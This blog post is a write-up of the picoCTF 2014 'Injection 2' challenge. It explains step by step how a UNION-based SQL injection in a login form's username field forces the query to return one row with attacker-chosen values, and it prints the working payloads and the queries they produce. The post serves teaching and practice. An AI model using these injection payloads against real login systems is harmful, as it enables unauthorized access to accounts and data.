---
slug: picoctf-2014-part1
title: "picoCTF 2014 part 1: Injection 2"
authors: csressel
#tags: []
---

Injection 2
========

Summary
--------------
By unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program’s requirements.
```SQL
SELECT * FROM users WHERE username='asdf' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- '
```
(with “1337” entered as the password)

<!--truncate-->

The Program
-------------------
The source is available <a href='http://web2014.picoctf.com/injection2/login.phps'>here</a>. Examination of the source shows several things.
First, we can make injections into the username field.
Second, the returned data from the query will need to meet the following requirements to reveal the flag:
- `mysqli_num_rows($result) === 1` — only one row
- `$row["password"] === $password` — row’s password must match our given password
- `$row["user_level"] >= 1337` — row’s user_level must be greater than or equal to 1337

Finally, by setting the form’s hidden field “debug” to 1, we receive a nice view of our input and the generated query.

The Injection
------------------
By taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements.

An injection of:
```
asdf' UNION SELECT 0 AS a LIMIT 1 -- 
```
Will yield the query:
```SQL
SELECT * FROM users WHERE username='asdf' UNION SELECT 0 AS a LIMIT 1 -- 
```

Let’s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.
This gives us the following error:
```
SQL error: The used SELECT statements have a different number of columns
```

However, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.
New query:
```SQL
SELECT * FROM users WHERE username='asdf' UNION SELECT 0 AS a, 0 AS b, 0 AS c, 0 AS d, 0 AS e LIMIT 1 -- 
```
As we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form.

The final query:
```SQL
SELECT * FROM users WHERE username='asdf' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- '
```

This proves successful!
(as the flag appears to be dynamically generated it is not included here)
